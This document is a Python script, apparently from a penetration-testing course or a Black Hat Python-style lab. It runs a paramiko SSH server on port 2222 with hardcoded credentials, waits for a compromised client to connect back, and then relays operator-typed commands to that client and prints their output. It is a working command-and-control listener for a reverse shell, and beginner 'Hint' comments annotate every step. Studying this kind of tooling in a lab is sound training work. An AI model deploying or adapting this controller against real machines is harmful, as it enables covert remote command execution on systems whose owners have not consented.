import os
import paramiko
import socket
import sys
import threading

# The Hint: os is the "Path Finder." It identifies the folder where your script is currently saved.
CWD = os.path.dirname(os.path.realpath(__file__))
# The Hint: RSAKey is the "Digital ID Card." It loads the private key file required to host an SSH service.
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))


class Server(paramiko.ServerInterface):
    # The Hint: __init__ is the "Constructor." It sets up the threading event for the session.
    def __init__(self):
        self.event = threading.Event()

    # The Hint: This is the "Service Gatekeeper." It only allows 'session' requests (terminal access).
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    # The Hint: This is the "Bouncer." It validates the username and password against the hardcoded values.
    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


if __name__ == '__main__':
    server = '192.168.72.133'  # Change this to your Kali IP
    ssh_port = 2222
    try:
        # The Hint: socket.socket is the "Phone Line." It establishes the raw TCP connection.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # The Hint: bind() is the "Anchor." It tells the OS to listen for traffic on Port 2222.
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # The Hint: Transport is the "Encryption Wrapper." It turns the raw socket into an encrypted SSH tunnel.
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    # The Hint: accept(20) is the "Waiting Room." It waits 20 seconds for the client to join the channel.
    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    # The Hint: recv(1024) is the "Incoming Ear." It catches the 'ClientConnected' message from the client.
    print(chan.recv(1024).decode())
    chan.send('Welcome to bh_ssh')

    try:
        while True:
            # The Hint: input() is the "Master Console." You type the command here to send to the client.
            command = input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                # The Hint: recv(8192) is the "Data Bucket." It collects the command output from the client.
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
